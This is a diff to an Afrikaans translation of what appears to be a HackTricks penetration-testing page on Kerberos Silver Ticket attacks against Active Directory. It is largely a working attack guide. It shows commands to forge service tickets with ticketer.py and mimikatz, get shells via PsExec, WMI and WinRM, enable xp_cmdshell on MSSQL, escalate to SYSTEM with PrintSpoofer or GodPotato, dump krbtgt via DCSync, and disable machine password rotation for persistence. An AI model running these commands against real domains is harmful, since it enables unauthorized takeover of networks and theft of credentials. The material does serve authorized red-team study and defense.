@@ -6,15 +6,14 @@
 
 ## Silver ticket
 
-Die **Silver Ticket** aanval behels die uitbuiting van dienskaartjies in Active Directory (AD) omgewings. Hierdie metode staat op **die verkryging van die NTLM-hash van 'n diensrekening**, soos 'n rekenaarrekening, om 'n Ticket Granting Service (TGS) kaartjie te vervals. Met hierdie vervalste kaartjie kan 'n aanvaller toegang verkry tot spesifieke dienste op die netwerk, **om enige gebruiker na te boots**, tipies met die doel om administratiewe regte te verkry. Dit word beklemtoon dat die gebruik van AES sleutels vir die vervalsing van kaartjies veiliger en minder opspoorbaar is.
+Die **Silver Ticket**-aanval behels die misbruik van service tickets in Active Directory (AD) omgewings. Hierdie metode berus op die **verkryging van die NTLM hash van 'n service account**, soos 'n rekenaarrekening, om 'n Ticket Granting Service (TGS) ticket te vervals. Met hierdie vervalste ticket kan 'n aanvaller toegang kry tot spesifieke dienste op die netwerk, **optree as enige gebruiker**, gewoonlik met die doel om administratiewe voorregte te bekom. Dit word beklemtoon dat die gebruik van AES-sleutels om tickets te vervals veiliger en minder opspoorbaar is.
 
 > [!WARNING]
-> Silver Tickets is minder opspoorbaar as Golden Tickets omdat hulle net die **hash van die diensrekening** vereis, nie die krbtgt rekening nie. Hulle is egter beperk tot die spesifieke diens wat hulle teiken. Boonop, net om die wagwoord van 'n gebruiker te steel.
-Boonop, as jy 'n **rekening se wagwoord met 'n SPN** kompromitteer, kan jy daardie wagwoord gebruik om 'n Silver Ticket te skep wat enige gebruiker na daardie diens naboots.
+> Silver Tickets is minder opspoorbaar as Golden Tickets omdat hulle slegs die **hash van die service account** benodig, nie die krbtgt-rekening nie. Hulle is egter beperk tot die spesifieke diens waarop hulle gemik is. As jy die **wagwoord van 'n rekening met 'n SPN** kompromitteer, kan jy daardie wagwoord gebruik om 'n Silver Ticket te skep wat as enige gebruiker na daardie diens optree.
 
-Vir kaartjie-ontwikkeling word verskillende gereedskap gebruik, gebaseer op die bedryfstelsel:
+Vir die vervaardiging van tickets word verskillende tools gebruik, afhangend van die bedryfstelsel:
 
-### On Linux
+### Op Linux
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
@@ -37,57 +36,88 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêerstelsel te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-vrae.
+Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêerstelsel te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir opdragte en WMI-navrae.
+
+### Voorbeeld: MSSQL service (MSSQLSvc) + Potato to SYSTEM
+
+Indien jy die NTLM-hash (of AES key) van 'n SQL service account (bv. sqlsvc) het, kan jy 'n TGS vir die MSSQL SPN vervals en enige gebruiker teenoor die SQL service imiteer. Van daar, skakel xp_cmdshell aan om opdragte as die SQL service account uit te voer. As daardie token SeImpersonatePrivilege het, ketting 'n Potato om na SYSTEM te eskaleer.
+```bash
+# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
+python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
+-spn MSSQLSvc/<host.fqdn>:1433 administrator
+export KRB5CCNAME=$PWD/administrator.ccache
+
+# Connect to SQL using Kerberos and run commands via xp_cmdshell
+impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
+-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
+```
+- As die resulterende konteks SeImpersonatePrivilege het (dikwels waar vir service accounts), gebruik 'n Potato-variant om SYSTEM te kry:
+```bash
+# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
+PrintSpoofer.exe -c "cmd /c whoami"
+# or
+GodPotato -cmd "cmd /c whoami"
+```
+Meer besonderhede oor die misbruik van MSSQL en die aktivering van xp_cmdshell:
+
+{{#ref}}
+abusing-ad-mssql.md
+{{#endref}}
+
+Potato techniques oorsig:
+
+{{#ref}}
+../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
+{{#endref}}
 
 ## Beskikbare Dienste
 
-| Diens Tipe                                 | Diens Silver Tickets                                                      |
-| ------------------------------------------ | ------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                 |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Afhangende van OS ook:</p><p>WSMAN</p><p>RPCSS</p> |
+| Service Type                               | Service Silver Tickets                                                     |
+| ------------------------------------------ | -------------------------------------------------------------------------- |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Afhangend van die OS ook:</p><p>WSMAN</p><p>RPCSS</p> |
 | WinRM                                      | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p> |
-| Geplande Take                              | HOST                                                                    |
-| Windows Lêer Deel, ook psexec              | CIFS                                                                    |
-| LDAP operasies, ingesluit DCSync          | LDAP                                                                    |
-| Windows Remote Server Administrasie Gereedskap | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                      |
-| Goue Tickets                               | krbtgt                                                                |
+| Scheduled Tasks                            | HOST                                                                       |
+| Windows File Share, also psexec            | CIFS                                                                       |
+| LDAP operations, included DCSync           | LDAP                                                                       |
+| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
+| Golden Tickets                             | krbtgt                                                                     |
 
-Met **Rubeus** kan jy **vra vir al** hierdie kaarte met die parameter:
+Using **Rubeus** you may **ask for all** these tickets using the parameter:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Gebeurtenis ID's
+### Silver tickets Gebeurtenis-ID's
 
-- 4624: Rekening Aanmelding
-- 4634: Rekening Afmelding
-- 4672: Admin Aanmelding
+- 4624: Rekening aanmelding
+- 4634: Rekening afmelding
+- 4672: Administrateur aanmelding
 
-## Volharding
+## Persistensie
 
-Om te verhoed dat masjiene hul wagwoord elke 30 dae draai, stel `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` of jy kan `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` op 'n groter waarde as 30 dae stel om die draai periode aan te dui wanneer die masjien se wagwoord gedraai moet word.
+Om te voorkom dat masjiene hul wagwoord elke 30 dae roteer, stel `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` of jy kan `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` instel op 'n groter waarde as 30 dae om die roteringsperiode aan te dui wanneer die masjien se wagwoord geroteer moet word.
 
-## Misbruik van Diens kaarte
+## Misbruik van Service tickets
 
-In die volgende voorbeelde kom ons veronderstel dat die kaart verkry is deur die administrateur rekening na te doen.
+In die volgende voorbeelde kom ons veronderstel dat die ticket verkry is deur die administrateurrekening na te boots.
 
 ### CIFS
 
-Met hierdie kaart sal jy in staat wees om toegang te verkry tot die `C$` en `ADMIN$` gids via **SMB** (as hulle blootgestel is) en lêers na 'n deel van die afstand lêerstelsel te kopieer deur iets soos te doen:
+Met hierdie ticket sal jy toegang hê tot die `C$` en `ADMIN$` vouer via **SMB** (as dit blootgestel is) en lêers na 'n deel van die afgeleë lêerstelsel kan kopieer deur iets soos die volgende te doen:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-U sal ook in staat wees om 'n shell binne die gasheer te verkry of arbitrêre opdragte uit te voer met behulp van **psexec**:
-
+Jy sal ook 'n shell binne die host kan verkry of arbitrêre opdragte kan uitvoer met **psexec**:
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
 {{#endref}}
 
-### GASHER
+### HOST
 
-Met hierdie toestemming kan u geskeduleerde take in afstandrekenaars genereer en arbitrêre opdragte uitvoer:
+Met hierdie toestemming kan jy geskeduleerde take op afgeleë rekenaars skep en arbitrêre opdragte uitvoer:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -101,7 +131,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-Met hierdie kaartjies kan jy **WMI in die slagoffer se stelsel uitvoer**:
+Met hierdie tickets kan jy **WMI in die slagoffer se stelsel uitvoer**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -113,24 +143,26 @@ wmic remote.computer.local list full /format:list
 ```
 Vind **meer inligting oor wmiexec** in die volgende bladsy:
 
+
 {{#ref}}
 ../lateral-movement/wmiexec.md
 {{#endref}}
 
 ### HOST + WSMAN (WINRM)
 
-Met winrm toegang oor 'n rekenaar kan jy **dit toegang** en selfs 'n PowerShell kry:
+Met winrm-toegang op 'n rekenaar kan jy daarby **toegang kry** en selfs 'n PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Kontrollere die volgende bladsy om **meer maniere te leer om met 'n afstandsbediener te verbind met winrm**:
+Check the following page to learn **more ways to connect with a remote host using winrm**:
+
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> Let daarop dat **winrm aktief en luisterend moet wees** op die afstandsrekenaar om toegang te verkry.
+> Let wel dat **winrm aktief moet wees en moet luister** op die afgeleë rekenaar om toegang daartoe te kry.
 
 ### LDAP
 
@@ -138,7 +170,7 @@ Met hierdie voorreg kan jy die DC-databasis dump met **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**Leer meer oor DCSync** in die volgende bladsy:
+**Lees meer oor DCSync** op die volgende bladsy:
 
 
 {{#ref}}
@@ -151,6 +183,7 @@ dcsync.md
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 - [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
+- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
 
 
 
